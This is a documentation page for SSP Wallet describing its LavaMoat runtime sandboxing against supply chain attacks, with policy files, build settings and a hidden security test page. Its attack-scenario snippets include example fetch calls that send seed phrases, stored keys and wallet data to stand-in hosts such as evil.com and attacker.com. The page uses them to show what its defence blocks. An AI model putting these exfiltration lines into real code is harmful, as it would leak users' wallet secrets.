# Runtime Security with LavaMoat

## Overview

SSP Wallet implements **[Vite Plugin LavaMoat](https://github.com/RunOnFlux/ssp-wallet/tree/master/packages/vite-plugin-lavamoat)** - a custom-built security framework that provides runtime compartmentalization and protection against supply chain attacks. This advanced security system ensures your wallet remains protected even if dependencies are compromised.

## What is LavaMoat?

LavaMoat is a security framework that creates isolated execution environments (compartments) for JavaScript modules. Each module runs with only the minimum permissions it needs, following the **principle of least privilege**.

### Core Principles

1. **Module Compartmentalization**: Each dependency runs in its own isolated sandbox
2. **Policy-Based Access Control**: Explicit permissions define what each module can access
3. **Defense in Depth**: Multiple layers of protection work together
4. **Zero Trust Architecture**: No module is trusted by default

## Security Features

### 1. SES Lockdown Runtime

The Secure ECMAScript (SES) lockdown provides fundamental protections:

- **Blocks dangerous APIs**: Prevents use of `eval()` and `Function` constructor
- **Prototype pollution prevention**: Locks down object prototypes to prevent tampering
- **Immutable intrinsics**: Protects built-in JavaScript objects from modification

```javascript
// These attacks are automatically blocked:
try {
  eval('malicious code');  // ❌ Blocked by LavaMoat
} catch (e) {
  console.log('Security protection active');
}

try {
  new Function('return steal_data()');  // ❌ Blocked by LavaMoat
} catch (e) {
  console.log('Function constructor blocked');
}

try {
  Object.prototype.polluted = 'hack';  // ❌ Blocked by LavaMoat
} catch (e) {
  console.log('Prototype pollution prevented');
}
```

### 2. Module Compartmentalization

Each of the **70+ packages** in SSP Wallet runs in isolated sandboxes:

```
┌─────────────────────────────────────────┐
│         Application Code                │
│  (Your wallet interface)                │
└──────────────┬──────────────────────────┘
               │
    ┌──────────┴──────────┐
    │                     │
┌───▼────────┐  ┌────────▼─────┐
│ Crypto Lib │  │  UI Library  │
│ Compartment│  │  Compartment │
│            │  │              │
│ Limited to:│  │ Limited to:  │
│ • crypto   │  │ • document   │
│ • Buffer   │  │ • window     │
│ • Math     │  │ • console    │
└────────────┘  └──────────────┘
```

### 3. Supply Chain Attack Protection

LavaMoat protects against compromised dependencies:

**Without LavaMoat:**
```javascript
// A compromised npm package could do:
localStorage.setItem('stolen', privateKey);  // ⚠️ Security breach
fetch('evil.com/steal', { body: seedPhrase });  // ⚠️ Data exfiltration
```

**With LavaMoat:**
```javascript
// The same malicious code is blocked:
localStorage.setItem('stolen', privateKey);  // ❌ No localStorage access
fetch('evil.com/steal', { body: seedPhrase });  // ❌ No network access
```

### 4. Granular Permission Controls

Each package receives only the permissions it needs:

```json
{
  "resources": {
    "viem": {
      "globals": {
        "crypto": true,      // ✅ Needed for cryptography
        "fetch": true,       // ✅ Needed for RPC calls
        "console": true      // ✅ Needed for debugging
        // ❌ No localStorage access
        // ❌ No document access
        // ❌ No eval/Function
      }
    },
    "react": {
      "globals": {
        "document": true,    // ✅ Needed for UI
        "window": true,      // ✅ Needed for events
        "console": true      // ✅ Needed for debugging
        // ❌ No crypto access
        // ❌ No network access
        // ❌ No storage access
      }
    }
  }
}
```

## Security Verification

### Accessing the Security Test Page

SSP Wallet includes a built-in security test interface that anyone can access to verify runtime protections are working:

**How to Access:**
1. Open SSP Wallet
2. Scroll to the footer at the bottom of the page
3. **Click the version number rapidly 5 times within 1 second**
4. The security test page will automatically open

This hidden developer feature allows you to run a comprehensive security audit directly in your browser and verify that all LavaMoat protections are active and functioning correctly.

### Available Tests

The security test page runs comprehensive checks:

- **Function Constructor Test**: Verifies `new Function()` is blocked
- **Eval Test**: Confirms `eval()` cannot execute arbitrary code
- **Prototype Pollution Test**: Validates object prototype protection
- **Global Property Test**: Checks global object immutability
- **WebAssembly Test**: Verifies WASM protections
- **Import Function Test**: Tests dynamic import restrictions

### Example Test Results

```
✅ PASS: eval() is correctly blocked
✅ PASS: Function constructor is blocked
✅ PASS: Prototype pollution prevented
✅ PASS: Global properties protected
✅ PASS: WebAssembly properly restricted
✅ PASS: Dynamic imports controlled

🛡️ Security Status: PROTECTED
📊 Tests Passed: 15/15
```

## LavaMoat Policy Management

### Static Security Policies

SSP Wallet uses **static policies** defined in `security/vite-lavamoat-policy.json`. This approach:

- ✅ **Predictable**: Behavior is consistent across environments
- ✅ **Auditable**: Security team can review exact permissions
- ✅ **Secure**: No runtime policy generation that could be manipulated
- ✅ **Performant**: No overhead from policy generation

### Policy Structure

```json
{
  "resources": {
    "package-name": {
      "packageName": "package-name",
      "globals": {
        "console": true,
        "crypto": true
      },
      "packages": {
        "dependency-1": true,
        "dependency-2": true
      },
      "builtins": {}
    }
  }
}
```

### Updating Policies

When adding new dependencies to SSP Wallet:

```bash
# Generate updated policy file
npm run generate-policy

# Review the changes
git diff security/vite-lavamoat-policy.json

# Ensure only necessary permissions are granted
```

## Production vs Development

### Development Mode

For the best developer experience, LavaMoat protections are **disabled in development**:

- No performance overhead during hot module reload
- Full access to browser DevTools
- Easier debugging and development
- Standard error messages and stack traces

```bash
yarn dev  # LavaMoat disabled for development
```

### Production Mode

In production builds, full security protections are active:

- All compartmentalization enforced
- Static policies applied to every module
- SES lockdown active
- Comprehensive runtime protection

```bash
yarn build:all  # LavaMoat fully enabled
```

## Technical Implementation

### Vite Plugin Architecture

```typescript
// vite.config.ts
import { viteLavaMoat } from './packages/vite-plugin-lavamoat';

export default defineConfig({
  plugins: [
    viteLavaMoat({
      policyPath: './security/vite-lavamoat-policy.json',
      lockdown: true,
      diagnostics: false,
      scuttleGlobalThis: {
        enabled: true,
        exceptions: ['chrome', 'browser']
      }
    })
  ]
});
```

### Runtime Initialization

The LavaMoat runtime initializes before any application code:

1. **Load Policy**: Parse security policies from JSON
2. **Apply Lockdown**: Enable SES protections
3. **Create Compartments**: Set up isolated execution environments
4. **Load Application**: Start wallet with full protection

### Browser Extension Integration

LavaMoat integrates seamlessly with Chrome extension APIs:

```javascript
// manifest.json - Content Security Policy
{
  "content_security_policy": {
    "extension_pages": "script-src 'self' 'wasm-unsafe-eval'; object-src 'self'"
  }
}
```

## Protected Packages

SSP Wallet protects **70+ packages** including:

### Cryptography Libraries
- `@noble/hashes` - Cryptographic hash functions
- `@noble/curves` - Elliptic curve cryptography
- `@scure/base` - Base encoding/decoding
- `@scure/bip32` - HD wallet key derivation
- `@scure/bip39` - Mnemonic seed phrase generation

### Web3 Libraries
- `viem` - Ethereum interactions
- `ethers` - Alternative Ethereum library
- `@bitcoinerlab/secp256k1` - Bitcoin cryptography

### UI Libraries
- `react` - User interface framework
- `react-dom` - DOM rendering
- `antd` - UI component library
- `react-qr-code` - QR code generation

### Utility Libraries
- `axios` - HTTP client
- `bignumber.js` - Precision math
- `buffer` - Node.js Buffer API
- And many more...

## Attack Scenarios Prevented

### Scenario 1: Compromised Dependency

**Attack**: Malicious update to a UI library attempts to steal private keys

```javascript
// Malicious code in compromised package
const keys = localStorage.getItem('encrypted_keys');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: keys
});
```

**LavaMoat Protection**:
- ❌ UI libraries have no `localStorage` access
- ❌ UI libraries have no `fetch` access
- ✅ Attack automatically blocked

### Scenario 2: Prototype Pollution

**Attack**: Dependency pollutes Object prototype to inject malicious behavior

```javascript
// Malicious code
Object.prototype.isAdmin = true;
Object.prototype.bypassSecurity = function() { /* ... */ };
```

**LavaMoat Protection**:
- ❌ Prototype modification blocked by SES lockdown
- ✅ Object prototypes remain immutable

### Scenario 3: Code Injection

**Attack**: Attacker uses eval to execute arbitrary code

```javascript
// Malicious code
const userInput = getDataFromURL();
eval(userInput);  // Could execute: "sendAllFundsTo('attacker')"
```

**LavaMoat Protection**:
- ❌ `eval()` completely disabled
- ❌ `Function` constructor blocked
- ✅ No dynamic code execution possible

### Scenario 4: Data Exfiltration

**Attack**: Analytics library compromised to steal wallet data

```javascript
// Malicious analytics update
const walletData = {
  addresses: getAllAddresses(),
  balances: getAllBalances(),
  transactions: getTransactionHistory()
};
fetch('evil.com/collect', { body: JSON.stringify(walletData) });
```

**LavaMoat Protection**:
- ❌ Analytics package has no access to wallet storage APIs
- ❌ Even with compromised code, cannot access sensitive data
- ✅ Compartmentalization prevents data access

## Security Benefits

### For Users

- **Peace of Mind**: Multiple layers of protection for your assets
- **Supply Chain Security**: Protected even if dependencies are compromised
- **Transparent Security**: Open source implementation you can verify
- **Continuous Protection**: Always active in production builds

### For Developers

- **Secure by Default**: No configuration needed for basic protection
- **Granular Control**: Fine-tune permissions when needed
- **Development Friendly**: Disabled in dev for best experience
- **Auditable**: Static policies easy to review

### For Security Auditors

- **Clear Policy Files**: All permissions explicitly defined
- **Deterministic Behavior**: Same security across all environments
- **Compartment Isolation**: Easy to verify module boundaries
- **Open Source**: Full code available for review

## Best Practices

### 1. Regular Policy Updates

When updating dependencies:

```bash
# Update dependencies
yarn upgrade

# Regenerate security policy
npm run generate-policy

# Review policy changes
git diff security/vite-lavamoat-policy.json

# Ensure only necessary new permissions
```

### 2. Security Audits

Periodically verify security:

- Run the security test page
- Review policy changes in pull requests
- Audit new dependencies before adding
- Monitor for unexpected permission requests

### 3. Dependency Hygiene

- Minimize total number of dependencies
- Prefer well-audited, established libraries
- Review dependency chains (sub-dependencies)
- Keep dependencies up-to-date with security patches

## Additional Resources

### SSP Wallet Implementation
- **[Vite Plugin LavaMoat Source Code](https://github.com/RunOnFlux/ssp-wallet/tree/master/packages/vite-plugin-lavamoat)** - Complete plugin implementation
- **[LavaMoat Policy File](https://github.com/RunOnFlux/ssp-wallet/blob/master/security/vite-lavamoat-policy.json)** - Security policies for 70+ packages
- **[Security Test Page](https://github.com/RunOnFlux/ssp-wallet/blob/master/src/pages/SecurityTest/SecurityTest.tsx)** - Runtime security verification

### Documentation
- [Security Overview](security-overview.md)
- [Halborn Security Audit](halborn-audit-2025.md)

### External Resources
- [LavaMoat Official Documentation](https://github.com/LavaMoat/LavaMoat)
- [Secure ECMAScript (SES)](https://github.com/endojs/endo/tree/master/packages/ses)
- [Supply Chain Security Best Practices](https://www.cisa.gov/supply-chain)

### Security Testing
- **Test Page Access**: Click version number 5 times rapidly in the wallet footer
- **Browser Console Check**: `window.__lavamoat_security_active`
- **Run Tests Manually**: `window.__lavamoat_run_security_tests()`

## Reporting Security Issues

If you discover a security vulnerability:

1. **Do NOT create a public GitHub issue**
2. **Use GitHub Security**: [Report vulnerability](https://github.com/RunOnFlux/ssp-wallet/security)
3. **Responsible Disclosure**: Allow time for fixes before public disclosure
4. **Contact Information**: Available in repository security policy

## Conclusion

LavaMoat runtime security is a critical component of SSP Wallet's defense-in-depth strategy. By compartmentalizing modules, enforcing least-privilege access, and blocking dangerous APIs, LavaMoat provides robust protection against supply chain attacks and code injection vulnerabilities.

Combined with SSP's other security features (2-of-2 multisig, device isolation, encryption), LavaMoat ensures your cryptocurrency assets remain secure even in the face of sophisticated attacks.

---

**Security Status**: 🛡️ **PROTECTED**
**Protected Packages**: 70+
**Last Updated**: October 2025
**Audit Status**: ✅ Halborn Audited
